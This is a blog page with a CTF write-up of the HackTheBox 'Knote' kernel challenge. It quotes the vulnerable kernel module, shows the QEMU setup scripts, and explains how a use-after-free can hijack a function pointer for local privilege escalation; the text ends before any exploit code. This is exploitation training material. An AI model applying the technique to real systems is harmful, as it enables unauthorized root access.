<!DOCTYPE html>
<html lang="en" class="dark-mode">
<head>

    <title>Knote (HackTheBox)</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=01ef4b6923" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=01ef4b6923" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=01ef4b6923" />

    <link rel="icon" href="https://10.10.11.7/content/images/size/w256h256/format/png/2024/01/favicon-1.webp" type="image/png">
    <link rel="canonical" href="https://10.10.11.7/knote/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="Pwning Tech">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Knote (HackTheBox)">
    <meta property="og:description" content="Heya infosec folks, in this write-up we will cover the Knote (kernel-note) kernel-pwn challenge on HackTheBox. We can trigger a local privilege escalation attack by exploiting a use-after-free bug. The description of the challenge is as follows:

Secure your secrets in the kernel space!


Summary

 * What are kernel modules?
 * How">
    <meta property="og:url" content="https://10.10.11.7/knote/">
    <meta property="og:image" content="https://10.10.11.7/content/images/2024/01/publication-cover-casper-1k.webp">
    <meta property="article:published_time" content="2023-01-15T23:21:55.000Z">
    <meta property="article:modified_time" content="2024-01-01T18:39:12.000Z">
    <meta property="article:tag" content="Binary Exploitation">
    <meta property="article:tag" content="HackTheBox challenges">
    <meta property="article:tag" content="Linux Syscalls">
    <meta property="article:tag" content="x64 Assembly">
    <meta property="article:tag" content="Linux Kernel">
    <meta property="article:tag" content="Heap Memory">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Knote (HackTheBox)">
    <meta name="twitter:description" content="Heya infosec folks, in this write-up we will cover the Knote (kernel-note) kernel-pwn challenge on HackTheBox. We can trigger a local privilege escalation attack by exploiting a use-after-free bug. The description of the challenge is as follows:

Secure your secrets in the kernel space!


Summary

 * What are kernel modules?
 * How">
    <meta name="twitter:url" content="https://10.10.11.7/knote/">
    <meta name="twitter:image" content="https://10.10.11.7/content/images/2023/12/logo_twitter_card.webp">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="notselwyn">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Binary Exploitation, HackTheBox challenges, Linux Syscalls, x64 Assembly, Linux Kernel, Heap Memory">
    <meta name="twitter:site" content="@notselwyn">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="482">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Pwning Tech",
        "url": "https://10.10.11.7/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://10.10.11.7/content/images/2024/01/logo_transparent.svg"
        }
    },
    "author": {
        "@type": "Person",
        "name": "notselwyn",
        "url": "https://10.10.11.7/author/notselwyn-2/",
        "sameAs": []
    },
    "headline": "Knote (HackTheBox)",
    "url": "https://10.10.11.7/knote/",
    "datePublished": "2023-01-15T23:21:55.000Z",
    "dateModified": "2024-01-01T18:39:12.000Z",
    "keywords": "Binary Exploitation, HackTheBox challenges, Linux Syscalls, x64 Assembly, Linux Kernel, Heap Memory",
    "description": "Heya infosec folks, in this write-up we will cover the Knote (kernel-note) kernel-pwn challenge on HackTheBox. We can trigger a local privilege escalation attack by exploiting a use-after-free bug. The description of the challenge is as follows:\n\nSecure your secrets in the kernel space!\n\n\nSummary\n\n * What are kernel modules?\n * How does this kernel CTF work?\n * Analyzing the kmodule\n * Finding primitives\n * Creating an exploit\n * Creating a real world version\n\n\nWhat are kernel modules?\n\nLinux ke",
    "mainEntityOfPage": "https://10.10.11.7/knote/"
}
    </script>

    <meta name="generator" content="Ghost 5.75">
    <link rel="alternate" type="application/rss+xml" title="Pwning Tech" href="https://10.10.11.7/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="edf92d97a2ffbb07659fa25625" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://10.10.11.7/" crossorigin="anonymous"></script>
    
    <link href="https://10.10.11.7/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=01ef4b6923"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=01ef4b6923">
    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism-themes/1.9.0/prism-vsc-dark-plus.min.css" integrity="sha512-ML8rkwYTFNcblPFx+VLgFIT2boa6f8DDP6p6go4+FT0/mJ8DCbCgi6S0UdjtzB3hKCr1zhU+YVB0AHhIloZP8Q==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-highlight/prism-line-highlight.min.css" integrity="sha512-nXlJLUeqPMp1Q3+Bd8Qds8tXeRVQscMscwysJm821C++9w6WtsFbJjPenZ8cQVMXyqSAismveQJc0C1splFDCA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/brands.min.css" integrity="sha512-W/zrbCncQnky/EzL+/AYwTtosvrM+YG/V6piQLSe2HuKS6cmbw89kjYkp3tWFn1dkWV7L1ruvJyKbLz73Vlgfg==" crossorigin="anonymous" referrerpolicy="no-referrer" />

<style>
    .gh-head-menu .nav-twitter a,
    .gh-head-menu .nav-github a {
        font-size: 0 !important;
    }

    .gh-head-menu .nav-twitter a::before,
    .gh-head-menu .nav-github a::before {
        font-family: "Font Awesome 6 Brands";
        display: inline-block;
        font-size: 20px;
        font-style: normal;
        font-weight: normal;
        font-variant: normal;
        text-rendering: auto;
        font-smoothing: antialiased;
    }

    .gh-head-menu .nav-twitter a::before {content: "\f099"}
    .gh-head-menu .nav-github a::before {content: "\f09b"}
</style>

<!-- Tocbot Stylesheet -->
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.css" />

<!-- Tocbot Inline CSS (Specific Adjustments for the Casper Theme) -->
<style>
   
.gh-content {
    position: relative;
 }

.gh-toc > .toc-list {
    position: relative;
    overflow: hidden;
    padding-left: 10px;
}
    
.toc-list-item a {
    text-decoration: none;
}
    
.toc-list-item {  
    list-style: none !important;
}
    
.toc-list {    
    margin-left: 20px;
}

@media (min-width: 1300px) {
     .gh-sidebar {
        position: absolute; 
        top: 0;
        bottom: 0;
        margin-top: 4vmin;
		margin-left: 20px;
        grid-column: 1 / 3;
    }
   
    .gh-toc {
        position: sticky;
        top: 4vmin;
    }
    
    /* compensate ToC margin (required for scrolling) */
    .article-header {
     	padding-bottom: 10px;   
    }
}

.gh-toc .is-active-link::before {
    background-color: var(--ghost-accent-color);
}
</style>

<style>
	/* fix cover image of blogpost (make it inline with the text) */
	.gh-canvas .article-image {
     	grid-column: 3/3;   
    }
</style>

<style>
  /* set font of entire website */
  body { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:400,600), sans-serif; }
  h1 h2 h3 h4 h5 h6 { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:600), sans-serif; }
</style><style>:root {--ghost-accent-color: #e01b24;}</style>

</head>
<body class="post-template tag-binexp tag-htb-challenges tag-syscalls tag-x64-assembly tag-linux-kernel tag-heap-memory tag-hash-import-2023-02-18-16-45 tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 is-head-left-logo has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://10.10.11.7">
                        <img src="https://10.10.11.7/content/images/2024/01/logo_transparent.svg" alt="Pwning Tech">
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://10.10.11.7/">Home</a></li>
    <li class="nav-about-me"><a href="https://10.10.11.7/about/">About Me</a></li>
    <li class="nav-twitter"><a href="https://twitter.com/notselwyn/">Twitter</a></li>
    <li class="nav-github"><a href="https://github.com/notselwyn/">Github</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-binexp tag-htb-challenges tag-syscalls tag-x64-assembly tag-linux-kernel tag-heap-memory tag-hash-import-2023-02-18-16-45 tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 featured no-image ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/binexp/">Binary Exploitation</a>
                </span>
                <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
        </div>

        <h1 class="article-title">Knote (HackTheBox)</h1>


        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list">
                <li class="author-list-item">
                    <a href="/author/notselwyn-2/" class="author-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
</a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/notselwyn-2/">notselwyn</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2023-01-16">Jan 16, 2023</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 16 min read</span>
                </div>
            </div>

        </section>
        </div>


    </header>

    <section class="gh-content gh-canvas">
        <p>Heya infosec folks, in this write-up we will cover the Knote (kernel-note) kernel-pwn challenge on HackTheBox. We can trigger a <strong>local privilege escalation</strong> attack by exploiting a <strong>use-after-free </strong>bug. The description of the challenge is as follows:</p><blockquote>Secure your secrets in the kernel space!</blockquote><h2 id="summary">Summary</h2><ul><li>What are kernel modules?</li><li>How does this kernel CTF work?</li><li>Analyzing the kmodule</li><li>Finding primitives</li><li>Creating an exploit</li><li>Creating a real world version</li></ul><h2 id="what-are-kernel-modules">What are kernel modules?</h2><p>Linux kernel modules are a way to extend the Linux kernel in a hotswappable way. Kernel modules are also used for creating drivers, which is why it's useful to learn how to exploit them. Thankfully, you can use the same pwn / exploitation techniques in kernel modules as in the core Linux kernel.</p><p>Kernel modules (kmodules) can do a lot of things that the core kernel can do as well: manage a virtual filesystem such as <code>/proc</code>, manage task structs, et cetera. They can register a device file as well, which you can use to communicate with the kmodule using read(), write(), ioctl(), et cetera. </p><p>You can insert, list, and remove kernel modules by respectively using the binaries <code>insmod</code>, <code>lsmod</code>, and <code>rmmod</code>. </p><h2 id="how-do-kernel-pwn-ctfs-work">How do kernel pwn CTFs work?</h2><p>The goal of most kernel pwn CTFs are local privilege escalation exploits, in which a user becomes root in order to read a root-only flag file. Typically, you will be given 3 files: </p><ul><li><code>qemu.sh</code>: a BASH script to run a QEMU command. QEMU (Quick EMUlator) is a FOSS instructionset simulator which you can use to run custom Linux kernels in custom filesystems. It may sound like a VM, but it is not. </li><li><code>initramfs.cpio.gz</code> / <code>rootfs.img</code>: the custom (compressed) filesystem to run QEMU with. </li><li><code>bzImage</code> : the custom Linux kernel to run QEMU with. </li></ul><p>Make sure to remove <code>-no-kvm</code> from <code>qemu.sh</code> as it is for old versions of Qemu. Also <strong>note that there's no kaslr, no smap, no smep, etc</strong>. </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

timeout --foreground 35 qemu-system-x86_64 -m 128M \
  -kernel ./bzImage \
  -append 'console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr' \
  -monitor /dev/null \
  -initrd ./initramfs.cpio.gz \
  -cpu qemu64 \
  -smp cores=1 \
  -nographic
</code></pre><figcaption><p><span style="white-space: pre-wrap;">qemu.sh content</span></p></figcaption></figure><p>Now you might see that I use <code>initramfs.cpio.gz</code> instead of the <code>initramfs.cpio.gz</code> which is supplied in the challenge. This is because I first extracted it using <code>cpio -iF rootfs.img</code>. After that, I used the following scripts to compress and decompress the resulting directory:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

if [ "$1" = "" ]; then
    echo "usage: $0 &lt;initramfs.cpio.gz&gt;";
else

    # Decompress a .cpio.gz packed file system
    mkdir initramfs
    pushd . &amp;&amp; pushd initramfs
    cp ../$1 .
    gzip -dc $1 | cpio -idm &amp;&gt;/dev/null &amp;&amp; rm $1
    popd
fi
</code></pre><figcaption><p><span style="white-space: pre-wrap;">decompress.sh</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

# Compress initramfs with the included statically linked exploit
in=$1
out=$(echo $in | awk '{ print substr( $0, 1, length($0)-2 ) }')
musl-gcc $in -static -pie -s -O0 -fPIE -o $out || exit 255
mv $out initramfs
pushd . &amp;&amp; pushd initramfs
find . -print0 | cpio --null --format=newc -o 2&gt;/dev/null | gzip -9 &gt; ../initramfs.cpio.gz
popd
</code></pre><figcaption><p><span style="white-space: pre-wrap;">compress.sh</span></p></figcaption></figure><p>So firstly I create an <code>initramfs.cpio.gz</code> for QEMU using <code>irfs_compress.sh initramfs/exploit.c &amp;&amp; ./qemu-cmd.sh</code>. Now, we can test QEMU by running <code>./qemu.sh</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">sh: can't access tty; job control turned off
~ $ whoami
user
~ $</code></pre><figcaption><p><span style="white-space: pre-wrap;">Qemu proof-of-concept (PoC)</span></p></figcaption></figure><h2 id="analyzing-the-kmodule">Analyzing the kmodule</h2><p>We are given the following C sourcecode of the <code>knote.ko</code> kernel module:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;linux/kernel.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/device.h&gt;
#include &lt;linux/mutex.h&gt;
#include &lt;linux/fs.h&gt;
#include &lt;linux/slab.h&gt;
#include &lt;linux/uaccess.h&gt;

#define DEVICE_NAME "knote"
#define CLASS_NAME "knote"

MODULE_AUTHOR("r4j");
MODULE_DESCRIPTION("Secure your secrets in the kernelspace");
MODULE_LICENSE("GPL");

static DEFINE_MUTEX(knote_ioctl_lock);
static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg);

static int major;
static struct class *knote_class  = NULL;
static struct device *knote_device = NULL;
static struct file_operations knote_fops = {
    .unlocked_ioctl = knote_ioctl
};

struct knote {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
};

struct knote_user {
    unsigned long idx;
    char * data;
    size_t len;
};

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};

struct knote *knotes[10];

void knote_encrypt(char * data, size_t len) {
    int i;
    for(i = 0; i &lt; len; ++i)
        data[i] ^= 0xaa;
}

void knote_decrypt(char *data, size_t len) {
    knote_encrypt(data, len);
}

static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;
    switch(cmd) {
        case KNOTE_CREATE:
            if(ku.len &gt; 0x20 || ku.idx &gt;= 10)
                return -EINVAL;
            char *data = kmalloc(ku.len, GFP_KERNEL);
            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
            if(data == NULL || knotes[ku.idx] == NULL) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -ENOMEM;
            }

            knotes[ku.idx]-&gt;data = data;
            knotes[ku.idx]-&gt;len = ku.len;
            if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
                kfree(knotes[ku.idx]-&gt;data);
                kfree(knotes[ku.idx]);
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
            knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
            break;
        case KNOTE_DELETE:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            kfree(knotes[ku.idx]-&gt;data);
            kfree(knotes[ku.idx]);
            knotes[ku.idx] = NULL;
            break;
        case KNOTE_READ:
            if(ku.idx &gt;= 10 || !knotes[ku.idx] || ku.len &gt; knotes[ku.idx]-&gt;len) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            if(copy_to_user(ku.data, knotes[ku.idx]-&gt;data, ku.len)) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            break;
        case KNOTE_ENCRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
         case KNOTE_DECRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            knotes[ku.idx]-&gt;decrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}

static int __init init_knote(void) {
    major = register_chrdev(0, DEVICE_NAME, &amp;knote_fops);
    if(major &lt; 0)
        return -1;

    knote_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(knote_class)) {
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    knote_device = device_create(knote_class, 0, MKDEV(major, 0), 0, DEVICE_NAME);
    if (IS_ERR(knote_device))
    {
        class_destroy(knote_class);
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    return 0;
}

static void __exit exit_knote(void)
{
    device_destroy(knote_class, MKDEV(major, 0));
    class_unregister(knote_class);
    class_destroy(knote_class);
    unregister_chrdev(major, DEVICE_NAME);
}

module_init(init_knote);
module_exit(exit_knote);
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Knote.c sourceode</span></p></figcaption></figure><p>The first thing that the kernel calls in a newly inserted module (c.q. <code>knote.ko</code>) is the function with keyword <code>__init</code>, which in this case belongs to the following init functions:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static int __init init_knote(void) {
    major = register_chrdev(0, DEVICE_NAME, &amp;knote_fops);
    if(major &lt; 0)
        return -1;

    knote_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(knote_class)) {
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    knote_device = device_create(knote_class, 0, MKDEV(major, 0), 0, DEVICE_NAME);
    if (IS_ERR(knote_device))
    {
        class_destroy(knote_class);
        unregister_chrdev(major, DEVICE_NAME);
        return -1;
    }

    return 0;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">First function called in the kmodule</span></p></figcaption></figure><p>As we can see, it registers a character device (<code>chrdev</code>) with the name "knote" and it enables the device operation <code>unlocked_iotctl</code>, which means that it's possible to interact with the device using <code>ioctl()</code>.  </p><figure class="kg-card kg-code-card"><pre><code class="language-c">static struct file_operations knote_fops = {
    .unlocked_ioctl = knote_ioctl
};
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Knote.ko file operations</span></p></figcaption></figure><p>This means that our only userland form of messing with the kmodule is using <code>ioctl()</code> to interact with the <code>knote_ioctl</code> function. As said, we need to use <code>int ioctl(int fd, unsigned long request, ...)</code> in the exploit to pass the file, cmd and arg arguments to <code>long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg)</code> . This function performs several commands: <code>KNOTE_CREATE</code>, <code>KNOTE_DELETE</code>, <code>KNOTE_READ</code>, <code>KNOTE_ENCRYPT</code> and <code>KNOTE_DECRYPT</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;

    switch(cmd) {
        case KNOTE_CREATE:
            // unsigned values
            if(ku.len &gt; 0x20 || ku.idx &gt;= 10)
                return -EINVAL;

            // create knote
            char *data = kmalloc(ku.len, GFP_KERNEL);
            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
            if(data == NULL || knotes[ku.idx] == NULL) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -ENOMEM;
            }

            // copy userdata to note data
            knotes[ku.idx]-&gt;data = data;
            knotes[ku.idx]-&gt;len = ku.len;
            if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
                kfree(knotes[ku.idx]-&gt;data);
                kfree(knotes[ku.idx]);
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
            knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
            break;
        case KNOTE_DELETE:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            
            kfree(knotes[ku.idx]-&gt;data);
            kfree(knotes[ku.idx]);
            knotes[ku.idx] = NULL;
            break;
        case KNOTE_READ:
            if (ku.idx &gt;= 10 || !knotes[ku.idx] || ku.len &gt; knotes[ku.idx]-&gt;len)
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }
            
            if (copy_to_user(ku.data, knotes[ku.idx]-&gt;data, ku.len)) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            break;
        case KNOTE_ENCRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }

            knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
         case KNOTE_DECRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }

            knotes[ku.idx]-&gt;decrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}
</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>knote_ioctl()</span></code><span style="white-space: pre-wrap;"> - used for interacting throug </span><code spellcheck="false" style="white-space: pre-wrap;"><span>ioctl()</span></code></p></figcaption></figure><p>As we can read, the <code>arg</code> parameter is used to supply values to a <code>knote_user</code> object, using <code>copy_from_user(&amp;ku, arg, sizeof(struct knote_user))</code>: copies <code>sizeof(struct knote_user)</code> bytes from userland pointer <code>arg</code> to kernel pointer <code>ko</code>. Secondly, it executes one of the <code>KNOTE_&lt;CMD&gt;</code> cases. </p><h2 id="finding-primitives">Finding primitives</h2><p>The first step of exploit development is identifying protections: earlier we found out that there's no active kernel protections (no kaslr, no smap, no smep, et cetera). Next, there's finding exploit primitives: let's start off with finding execution flow hijacking. Firstly I checked for any forms of buffer overflow bugs on the stack and on the heap, but I couldn't find anything. However, once I took a look at <code>KNOTE_CREATE</code>, I saw that a use-after-free bug can be triggered. </p><h3 id="finding-a-memory-corruption-bug">Finding a memory corruption bug</h3><p>The <code>KNOTE_CREATE</code> command allocates a knote and it's data using <code>kmalloc</code>, which stands for <strong>k</strong>ernel <strong>malloc</strong>. Then, it tries to copy the userland data to the kernel note data. However if that copy fails, it will <code>kfree</code> (<strong>k</strong>ernel <strong>free</strong>) both the kernel note and the kernel notes' data.</p><pre><code class="language-c">static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;

    switch(cmd) {
        case KNOTE_CREATE:
            // unsigned values
            if(ku.len &gt; 0x20 || ku.idx &gt;= 10)
                return -EINVAL;

            // create knote
            char *data = kmalloc(ku.len, GFP_KERNEL);
            knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
            // ...
            
            // copy userdata to note data
            knotes[ku.idx]-&gt;data = data;
            knotes[ku.idx]-&gt;len = ku.len;
            if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
                kfree(knotes[ku.idx]-&gt;data);
                kfree(knotes[ku.idx]);
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EFAULT;
            }
            knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
            knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
            break;
        // ...
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}
</code></pre><p>Before we dive into the details, please realize that the kernel heap cache works like a stack containing heap chunk pointers: you push them with kfree and pop them with kmalloc </p><p>It took me a bit of puzzling but I figured out that we can leverage this to trigger a <strong>use-after-free</strong> (UAF) bug. If we create a knote that fails <code>copy_from_user</code> by providing an invalid pointer, the kmodule will <code>kfree(data)</code> and after that it will <code>kfree(knote)</code> but it <strong>wont reset </strong><code>knotes[ku.idx] = NULL</code>. Additionally, the allocation is in the wrong order of <code>kmalloc(data)</code> and then <code>kmalloc(knote)</code>. Because of this, a weird UAF scenario arises in the kernel memory cache where we can overwrite <code>knotes[ku.idx]</code> with userland <code>ku.data</code>. For clarification of this mindboggling bug I have made the following diagram:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://10.10.11.7/content/images/2023/01/image-1.png" class="kg-image" alt="" loading="lazy" width="1668" height="317" srcset="https://10.10.11.7/content/images/size/w600/2023/01/image-1.png 600w, https://10.10.11.7/content/images/size/w1000/2023/01/image-1.png 1000w, https://10.10.11.7/content/images/size/w1600/2023/01/image-1.png 1600w, https://10.10.11.7/content/images/2023/01/image-1.png 1668w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Description of th UAF bug</span></figcaption></figure><h3 id="finding-a-way-to-hijack-execution-flow">Finding a way to hijack execution flow</h3><p>Now we have a UAF bug, we need to find ways to get code execution by utilizing it. After analyzing more commands, I noted that the <code>KNOTE_ENCRYPT</code> command calls <code>knote-&gt;encrypt_func</code>, stored in the <code>knote</code> structure. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">struct knote {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
};
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>knote</span></code><span style="white-space: pre-wrap;"> structure</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">static long knote_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    mutex_lock(&amp;knote_ioctl_lock);
    
    struct knote_user ku;
    if(copy_from_user(&amp;ku, (void *)arg, sizeof(struct knote_user)))
        return -EFAULT;

    switch(cmd) {
        // ...
        case KNOTE_ENCRYPT:
            if(ku.idx &gt;= 10 || !knotes[ku.idx]) 
            {
                mutex_unlock(&amp;knote_ioctl_lock);
                return -EINVAL;
            }

            knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
            break;
         // ...
        default:
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EINVAL;
    }
    mutex_unlock(&amp;knote_ioctl_lock);
    return 0;
}
